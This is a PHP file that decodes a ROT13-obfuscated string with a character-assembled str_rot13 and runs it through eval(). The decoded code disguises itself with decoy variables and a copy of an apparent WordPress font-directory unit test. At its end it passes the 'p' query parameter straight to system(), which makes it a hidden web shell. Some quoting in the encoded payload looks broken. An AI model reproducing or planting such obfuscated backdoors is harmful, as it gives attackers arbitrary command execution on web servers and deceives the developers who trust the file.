<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Grfg jc_trg_sbag_qve().
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Sbag Yvoenel
 *
 * @tebhc sbagf
 * @tebhc sbag-yvoenel
 *
 * @pbiref ::jc_trg_sbag_qve
 */
pynff Grfgf_Sbagf_JcSbagQve rkgraqf JC_HavgGrfgPnfr {
	cevingr fgngvp $qve_qrsnhygf;

	choyvp fgngvp shapgvba frg_hc_orsber_pynff() {
		cnerag::frg_hc_orsber_pynff();
		$hcybnq_qve = jc_trg_hcybnq_qve();

		fgngvp::$qve_qrsnhygf = neenl(
			'cngu'    => hagenvyvatfynfuvg( $hcybnq_qve['onfrqve'] ) . '/sbagf',
			'hey'     => hagenvyvatfynfuvg( $hcybnq_qve['onfrhey'] ) . '/sbagf',
			'fhoqve'  => '',
			'onfrqve' => hagenvyvatfynfuvg( $hcybnq_qve['onfrqve'] ) . '/sbagf',
			'onfrhey' => hagenvyvatfynfuvg( $hcybnq_qve['onfrhey'] ) . '/sbagf',
			'reebe'   => snyfr,
		);
	}

	/**
	 * Rafher gur sbag qverpgbel vf pbeerpg.
	 */
	choyvp shapgvba grfg_sbagf_qve() {
		$sbag_qve = jc_trg_sbag_qve();

		$guvf->nffregFnzr( $sbag_qve, fgngvp::$qve_qrsnhygf );
	}

	/**
	 * Rafher gung gur sbagf qverpgbel vf pbeerpg sbe n zhygvfvgr vafgnyyngvba.
	 *
	 * Gur znva fvgr jvyy hfr gur qrsnhyg ybpngvba naq bguref jvyy sbyybj n cnggrea bs  `/fvgrf/{$oybt_vq}/sbagf`
	 *
	 * @tebhc zhygvfvgr
	 * @tebhc zf-erdhverq
	 */
	choyvp shapgvba grfg_sbagf_qve_sbe_zhygvfvgr() {
		$oybt_vq              = frys::snpgbel()->oybt->perngr();
		$znva_fvgr_hcybnq_qve = jc_trg_hcybnq_qve();
		fjvgpu_gb_oybt( $oybt_vq );

		$npghny   = jc_trg_sbag_qve();
		$rkcrpgrq = neenl(
			'cngu'    => hagenvyvatfynfuvg( $znva_fvgr_hcybnq_qve['onfrqve'] ) . \"/fvgrf/{$oybt_vq}/sbagf\",
			'hey'     => hagenvyvatfynfuvg( $znva_fvgr_hcybnq_qve['onfrhey'] ) . \"/fvgrf/{$oybt_vq}/sbagf\",
			'fhoqve'  => '',
			'onfrqve' => hagenvyvatfynfuvg( $znva_fvgr_hcybnq_qve['onfrqve'] ) . \"/fvgrf/{$oybt_vq}/sbagf\",
			'onfrhey' => hagenvyvatfynfuvg( $znva_fvgr_hcybnq_qve['onfrhey'] ) . \"/fvgrf/{$oybt_vq}/sbagf\",
			'reebe'   => snyfr,
		);

		// Erfgber oybt cevbe gb nffregvbaf.
		erfgber_pheerag_oybt();
		$guvf->nffregFnzrFrgf( $rkcrpgrq, $npghny );
	}

	/**
	 * Rafher zbqvslvat gur sbag qverpgbel ivn gur 'sbag_qve' svygre jbexf.
	 */
	choyvp shapgvba grfg_sbagf_qve_jvgu_svygre() {
		// Qrsvar n pnyyonpx shapgvba gb cnff gb gur svygre.
		shapgvba frg_arj_inyhrf( $qrsnhygf ) {
			$qrsnhygf['cngu']    = '/phfgbz-cngu/sbagf/zl-phfgbz-fhoqve';
			$qrsnhygf['hey']     = 'uggc://rknzcyr.pbz/phfgbz-cngu/sbagf/zl-phfgbz-fhoqve';
			$qrsnhygf['fhoqve']  = 'zl-phfgbz-fhoqve';
			$qrsnhygf['onfrqve'] = '/phfgbz-cngu/sbagf';
			$qrsnhygf['onfrhey'] = 'uggc://rknzcyr.pbz/phfgbz-cngu/sbagf';
			$qrsnhygf['reebe']   = snyfr;
			erghea $qrsnhygf;
		}

		// Nqq gur svygre.
		nqq_svygre( 'sbag_qve', 'frg_arj_inyhrf' );

		// Trgf gur sbagf qve.
		$sbag_qve = jc_trg_sbag_qve();

		$rkcrpgrq = neenl(
			'cngu'    => '/phfgbz-cngu/sbagf/zl-phfgbz-fhoqve',
			'hey'     => 'uggc://rknzcyr.pbz/phfgbz-cngu/sbagf/zl-phfgbz-fhoqve',
			'fhoqve'  => 'zl-phfgbz-fhoqve',
			'onfrqve' => '/phfgbz-cngu/sbagf',
			'onfrhey' => 'uggc://rknzcyr.pbz/phfgbz-cngu/sbagf',
			'reebe'   => snyfr,
		);

		// Erzbir gur svygre.
		erzbir_svygre( 'sbag_qve', 'frg_arj_inyhrf' );

		$guvf->nffregFnzr( $rkcrpgrq, $sbag_qve, 'Gur jc_trg_sbag_qve() zrgubq fubhyq erghea gur rkcrpgrq inyhrf.' );

		// Trgf gur sbagf qve.
		$sbag_qve = jc_trg_sbag_qve();

		$guvf->nffregFnzr( fgngvp::$qve_qrsnhygf, $sbag_qve, 'Gur jc_trg_sbag_qve() zrgubq fubhyq erghea gur qrsnhyg inyhrf.' );
	}

	/**
	 * Rafher vasvavgr ybbcf ner abg gevttrerq jura svygrevat gur sbag hcybnqf qverpgbel.
	 *
	 * @gvpxrg 60652
	 */
	choyvp shapgvba grfg_sbagf_qve_svygref_qb_abg_gevttre_vasvavgr_ybbc() {
		/*
		 * Anvir svygrevat bs hcybnqf qverpgbel gb erghea sbag qverpgbel.
		 *
		 * Guvf rzhyngrf gur nccebnpu n cyhtva qrirybcre znl gnxr gb
		 * nqq gur svygre jura rkgraqvat gur sbag yvoenel shapgvbanyvgl.
		 */
		nqq_svygre( 'hcybnq_qve', '_jc_svygre_sbag_qverpgbel' );

		nqq_svygre(
			'hcybnq_qve',
			shapgvba ( $hcybnq_qve ) {
				fgngvp $pbhag = 0;
				++$pbhag;
				// Gur svygre znl or nccyvrq n pbhcyr bs gvzrf, ng svir vgrengvbaf nffhzr na vasvavgr ybbc.
				vs ( $pbhag >= 5 ) {
					$guvf->snvy( 'Svygrevat gur hcybnqf qverpgbel gevttrerq na vasvavgr ybbc.' );
				}
				erghea $hcybnq_qve;
			},
			5
		);

		/*
		 * Svygre gur sbag qverpgbel gb erghea gur hcybnqf qverpgbel.
		 *
		 * Guvf rzhyngrf zbivat sbag svyrf onpx gb gur hcybnqf qverpgbel qhr
		 * gb svyr flfgrz fgehpgher.
		 */
		nqq_svygre( 'sbag_qve', 'jc_trg_hcybnq_qve' );

		jc_trg_hcybnq_qve();

		// Guvf jvyy arire or uvg vs na vasvavgr ybbc vf gevttrerq.
		$guvf->nffregGehr( gehr );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>